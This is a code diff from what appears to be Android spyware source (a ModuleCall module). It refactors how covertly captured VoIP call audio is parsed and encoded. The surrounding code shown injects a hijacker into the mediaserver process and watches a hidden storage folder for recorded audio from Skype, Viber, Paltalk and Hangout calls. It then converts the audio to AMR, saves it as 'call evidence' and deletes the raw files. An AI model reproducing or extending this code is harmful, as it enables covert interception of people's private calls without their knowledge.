@@ -11,11 +11,8 @@ package com.android.deviceinfo.module;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.FilenameFilter;
 import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
@@ -42,7 +39,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.resample.Resample;
-import com.android.deviceinfo.util.AudioEncoding;
+import com.android.deviceinfo.util.AudioEncoder;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
@@ -125,7 +122,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		boolean audioStorageOk = false;
 
 		for (int i = 0; i < 5; i++) {
-			if (AudioEncoding.createAudioStorage() == true) {
+			if (AudioEncoder.createAudioStorage() == true) {
 				audioStorageOk = true;
 				break;
 			}
@@ -148,7 +145,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
 			
-			Instrument hijack = new Instrument("mediaserver", AudioEncoding.getAudioStorage());
+			Instrument hijack = new Instrument("mediaserver", AudioEncoder.getAudioStorage());
 			
 			if (hijack.installHijacker()) {
 				if (Cfg.DEBUG) {
@@ -191,7 +188,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			// Observe our audio storage (events are filtered so if you push a .tmp using ADB it wont
 			// trigger, you have to copy the test file and RENAME it .tmp to trigger this observer)
-			observer = new FileObserver(AudioEncoding.getAudioStorage(), FileObserver.MOVED_TO) {
+			observer = new FileObserver(AudioEncoder.getAudioStorage(), FileObserver.MOVED_TO) {
 				@Override
 				public void onEvent(int event, String file) {
 					if (Cfg.DEBUG) {
@@ -199,7 +196,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					}
 					
 					// Add to list
-					if (addToEncodingList(AudioEncoding.getAudioStorage() + file) == true) {
+					if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
 						synchronized(sync) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + "(onEvent): signaling EncodingTask thread");
@@ -217,7 +214,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private void purgeAudio() {
 		// Scrub for existing files on FS
-		File f = new File(AudioEncoding.getAudioStorage());
+		File f = new File(AudioEncoder.getAudioStorage());
 		
 		FilenameFilter filter = new FilenameFilter() {
 		    public boolean accept(File dir, String name) {
@@ -252,7 +249,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	
 	private void scrubAudio() {
 		// Scrub for existing files on FS
-		File f = new File(AudioEncoding.getAudioStorage());
+		File f = new File(AudioEncoder.getAudioStorage());
 		
 		FilenameFilter filter = new FilenameFilter() {
 		    public boolean accept(File dir, String name) {
@@ -936,166 +933,47 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	// start: call start date
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
-	private boolean encodeChunks(String f) throws IOException {
-		int end_of_call = 0xF00DF00D;
-		int epoch, streamType, sampleRate = 44100, blockLen;
-		int discard_frame_size = 8;
+	private void encodeChunks(String f) {
+		int first_epoch, last_epoch;
+		AudioEncoder audioEncoder = new AudioEncoder(f);
 
-		// header format - each field is 4 bytes le :
-		// epoch : streamType : sampleRate : blockLen
-		File raw = new File(f);
+		first_epoch = audioEncoder.getCallStartTime();
+		last_epoch = audioEncoder.getCallEndTime();
 
-		FileInputStream in = null;
+		// Now rawPcm contains the raw data
+		String encodedFile = f + ".err";
 
-		try {
-			in = new FileInputStream(raw);
+		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample())) {
+			Date begin = new Date(first_epoch * 1000L);
+			Date end = new Date(last_epoch * 1000L);
 
-			byte data[] = new byte[(int)raw.length()];
-			in.read(data, 0, (int)raw.length());
+			int remote;
 
-			ByteBuffer d = ByteBuffer.wrap(data);
-			d.order(ByteOrder.LITTLE_ENDIAN);
-
-			data = null;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(encodeChunks): Parsing " + f);
+			if (encodedFile.endsWith("-r.tmp.err")) {
+				remote = 1;
+			} else {
+				remote = 0;
 			}
 
-			int data_size = 0, last_epoch = 0, first_epoch = 0;
+			// Encode to evidence
+			saveCallEvidence("+666", true, begin, end, encodedFile, false, remote);
 
-			// First round calculates the bitrate and real size of audio data
-			while (d.remaining() > 0) {
-				int cur_epoch = d.getInt();
-
-				d.position(d.position() + 8); // Discard streamType and sampleRate
-				blockLen = d.getInt();
-
-				// Discarded bytes must be discarded in the next loop too
-				if (blockLen != discard_frame_size) {
-					if (first_epoch == 0) {
-						first_epoch = cur_epoch;
-					}
-
-					data_size += blockLen; // Get blockLen
-					last_epoch = cur_epoch;
-				}
+			// We have an end of call and it's on both channels
+			if (audioEncoder.isLastCallFinished()) {
+				// After encoding create the end of call marker
+				closeCallEvidence("+666", true, begin, end);
 
 				if (Cfg.DEBUG) {
-					//Check.log(TAG + "(encodeChunks): blockLen: " + blockLen + " remaining: " + d.remaining() + " current position: " + d.position() + " next position: " + (d.position() + blockLen));
+					Check.log(TAG + "(encodeChunks): end of call reached");
 				}
-
-				d.position(d.position() + blockLen);
-			}
-
-			// Let's start again
-			d.rewind();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(encodeChunks): raw data size: " + data_size + " bytes, file length: " + (last_epoch - first_epoch) + " seconds");
-			}
-
-			byte[] rawPcm = new byte[data_size];
-			int pos = 0;
-			boolean call_finished = false;
-
-			// Second round extracts only the audio data
-			while (d.remaining() > 0) {
-				epoch = d.getInt();
-				streamType = d.getInt();
-				sampleRate = d.getInt();
-				blockLen = d.getInt();
-
-				if (Cfg.DEBUG) {
-					//Check.log(TAG + "(encodeChunks): epoch: " + epoch + " streamType: " + streamType + " sampleRate: " + sampleRate + " blockLen: " + blockLen);
-				}
-
-				if (streamType == end_of_call) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(encodeChunks): end of call reached for " + f);
-					}
-
-					call_finished = true;
-
-					if (d.remaining() > 0) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(encodeChunks): ***WARNING*** end of call reached and still " + d.remaining() + " bytes remaining!");
-						}
-					}
-
-					continue;
-				}
-
-				if (blockLen == discard_frame_size) {
-					if (Cfg.DEBUG) {
-						//Check.log(TAG + "(encodeChunks): skipping misterious frame (length: " + blockLen + " bytes)");
-					}
-
-					d.position(d.position() + blockLen);
-					continue;
-				}
-
-				byte[] rawPcmBlock = new byte[blockLen];
-				d.get(rawPcmBlock);
-
-				System.arraycopy(rawPcmBlock, 0, rawPcm, pos, rawPcmBlock.length);
-				pos += blockLen;
-			}
-
-			int bitRate = AudioEncoding.getBitrate(last_epoch - first_epoch, data_size);
-
-			// Ideally the sample rate should be the same for every chunk... Ideally...
-			if (bitRate < 0) {
-				// Borderline case in which we are unable to infer the real value
-				bitRate = sampleRate;
-			}
-
-			WaveHeader header = Resample.createHeader(bitRate, rawPcm.length);
-
-			// Resample audio
-			Wave wave = Resample.resampleRaw(header, rawPcm);
-
-			// Now rawPcm contains the raw data
-			String encodedFile = f + ".err";
-
-			if (AudioEncoding.encodetoAmr(encodedFile, wave.getBytes())) {
-				Date begin = new Date(first_epoch * 1000L);
-				Date end = new Date(last_epoch * 1000L);
-
-				int remote;
-
-				if (encodedFile.endsWith("-r.tmp.err")) {
-					remote = 1;
-				} else {
-					remote = 0;
-				}
-
-				// Encode to evidence
-				saveCallEvidence("+666", true, begin, end, encodedFile, false, remote);
-
-				// We have an end of call and it's on both channels
-				if (call_finished) {
-					// After encoding create the end of call marker
-					closeCallEvidence("+666", true, begin, end);
-
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(encodeChunks): end of call reached");
-					}
-				}	
-			}
-
-			// Remove file
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(encodeChunks): deleting " +  f);
-			}
-
-			raw.delete();
-		} finally {
-			if (in != null) {
-				in.close();
-			}
+			}	
 		}
 
-		return true;
+		// Remove file
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(encodeChunks): deleting " +  f);
+		}
+
+		audioEncoder.removeRawFile();
 	}
 }
